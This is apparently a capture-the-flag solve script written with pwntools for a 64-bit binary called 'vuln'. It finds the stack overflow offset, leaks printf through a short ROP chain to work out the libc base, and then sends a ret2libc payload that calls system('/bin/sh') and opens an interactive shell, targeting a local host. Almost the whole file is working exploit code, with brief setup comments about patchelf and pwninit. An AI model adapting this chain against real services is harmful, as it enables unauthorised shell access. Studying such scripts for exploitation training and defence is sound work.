from pwn import *
"""
====================================
    SETTING UP ENVIRONMENT
====================================

1. The given `vuln` binary is a 64-bit ELF executable, dynamically linked. ld-linux-x86-64.so.2 & libc.so.6 are given in the challenge.

libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f105a6ea000)
/lib64/ld-linux-x86-64.so.2 (0x00007f105a8ed000)

Option 1:
Link them with:
* patchelf --set-interpreter ./ld-linux-x86-64.so.2 ./vuln
    -> Forces `vuln` to use the given ld-linux-x86-64.so.2

* export LD_LIBRARY_PATH=.:$LD_LIBRARY_PATH
    -> Sets the library PATH to current directory
    
Option 2:

pwninit

"""

exe               = ELF ( './vuln' )
context.binary    = exe
context.log_level = 'info'

if args.REMOTE:
    io = remote ( '127.0.0.1', 5000 )
else:
    io = process ( exe.path )

"""
====================================
    IGNORE ABOVE CODE (SETUP)
====================================
"""

def find_offset( exe: ELF ) -> int:
    pattern = cyclic( 100 )
    io = process ( exe.path )
    io.sendline( pattern )
    io.wait()
    core = Coredump( './core' )
    io.close()
    return cyclic_find ( core.fault_addr , n = 4 )

def leak_printf():
    payload   = b'A' * offset              # ;; 0x00000000000401199 <+83> @ RIP
    payload  += p64 ( 0x0000000000401016 ) # ;; ret                        | ropper --file vuln --search "ret;"
    payload  += p64 ( 0x0000000000401156 ) # ;; 02x0000000000401156 <main> | objdump -d -M intel ./vuln | grep "<main>:"

    io.sendline ( payload )

    printf_leak = io.recvline().decode().strip().split(' ')[3].strip()[:-1]
    printf_leak = int ( printf_leak, 16 )
    return printf_leak

#offset  = find_offset ( exe )
offset  = 40
libc    = ELF ( './libc.so.6' )   # ;; ldd vuln | grep libc.so.6

printf_leak = leak_printf()
log.success ( f'leaked printf @ {hex ( printf_leak )}' )

libc.address = printf_leak - libc.symbols [ 'printf' ]
log.success ( f'found libc base @ {hex ( libc.address )}' )

payload   = b'B' * offset                                # ;; 0x00000000000401199 <+83> @ RIP
payload  += p64 ( libc.address + 0x000000000002a3e5 )    # ;; pop rdi; ret | ropper --file libc.so.6  --search "pop rdi; ret;"
payload  += p64 ( next ( libc.search ( b'/bin/sh' ) ) )  # ;; put /bin/sh on the stack (args)
payload  += p64 ( 0x0000000000401016 )                   # ;; ret          | ropper --file vuln --search "ret;"
payload  += p64 ( libc.symbols [ 'system' ] )            # ;; win?

io.sendline ( payload )
io.interactive()
